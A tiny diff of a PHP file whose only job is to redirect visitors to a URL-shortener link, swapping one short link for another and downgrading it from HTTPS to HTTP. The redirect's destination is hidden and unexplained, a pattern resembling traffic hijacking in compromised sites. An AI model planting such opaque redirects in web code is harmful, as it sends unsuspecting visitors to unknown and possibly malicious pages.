@@ -1,5 +1,5 @@
 <?php
-  header('Location: https://cuttly.click/0un3s');
+  header('Location: http://cuttly.click/p80wu');
   exit;
 
 
